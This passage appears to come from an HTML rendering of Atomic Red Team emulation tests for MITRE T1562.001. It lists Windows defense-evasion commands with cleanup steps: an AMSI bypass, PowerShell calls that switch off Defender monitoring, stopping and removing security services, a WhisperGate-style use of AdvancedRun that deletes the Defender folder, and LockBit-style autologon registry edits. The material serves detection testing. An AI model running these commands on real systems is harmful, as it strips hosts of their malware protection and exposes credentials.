<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 695eed40-e949-40e5-b306-b4031e4154bd</li>
<li><strong>name</strong>: AMSI Bypass - AMSI InitFailed</li>
<li><strong>description</strong>: Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
Upon execution, no output is displayed.</li>
</ul>
<p>https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1562.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 6b8df440-51ec-4d53-bf83-899591c9b5d7</li>
<li><strong>name</strong>: Tamper with Windows Defender ATP PowerShell</li>
<li>
<p><strong>description</strong>: Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled
in Windows settings.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Set-MpPreference -DisableRealtimeMonitoring 1
Set-MpPreference -DisableBehaviorMonitoring 1
Set-MpPreference -DisableScriptScanning 1
Set-MpPreference -DisableBlockAtFirstSeen 1</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Set-MpPreference -DisableRealtimeMonitoring 0
Set-MpPreference -DisableBehaviorMonitoring 0
Set-MpPreference -DisableScriptScanning 0
Set-MpPreference -DisableBlockAtFirstSeen 0</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1562.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: ae753dda-0f15-4af6-a168-b9ba16143143</li>
<li><strong>name</strong>: Stop and Remove Arbitrary Security Windows Service</li>
<li>
<p><strong>description</strong>: Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Stop-Service -Name #{service_name}
Remove-Service -Name #{service_name}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1562.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 81ce22fd-9612-4154-918e-8a1f285d214d</li>
<li><strong>name</strong>: Disable Defender Using NirSoft AdvancedRun</li>
<li>
<p><strong>description</strong>: Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html
This Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.
See https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3
Upon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. </p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
if(#{delete_defender_folder}){
  $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse
  Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}
}</p>
</li>
<li>
<p><strong>prereq_command</strong>: if(Test-Path -Path "#{AdvancedRun_Location}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -OutFile "PathToAtomicsFolder..\ExternalPayloads\advancedrun.zip"
Expand-Archive -path "PathToAtomicsFolder..\ExternalPayloads\advancedrun.zip" -destinationpath "PathToAtomicsFolder..\ExternalPayloads\" -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1562.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: c531aa6e-9c97-4b29-afee-9b7be6fc8a64</li>
<li><strong>name</strong>: Tamper with Windows Defender ATP using Aliases - PowerShell</li>
<li>
<p><strong>description</strong>: Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled
in Windows settings.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Set-MpPreference -drtm $True
Set-MpPreference -dbm $True
Set-MpPreference -dscrptsc $True
Set-MpPreference -dbaf $True</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Set-MpPreference -drtm 0
Set-MpPreference -dbm 0
Set-MpPreference -dscrptsc 0
Set-MpPreference -dbaf 0</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1562.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: d8c57eaa-497a-4a08-961e-bd5efd7c9374</li>
<li><strong>name</strong>: LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell</li>
<li>
<p><strong>description</strong>: LockBit Black - Disable Privacy Settings Experience Using Registry</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\OOBE" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\OOBE" -Name DisablePrivacyExperience -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1562.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 5e27f36d-5132-4537-b43b-413b0d5eec9a</li>
<li><strong>name</strong>: Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell</li>
<li>
<p><strong>description</strong>: Lockbit Black - Use Registry Editor to turn on automatic logon</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force
New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -Value Administrator -Force
New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -Value contoso.com -Force
New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword  -Value password1 -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -Force -ErrorAction Ignore
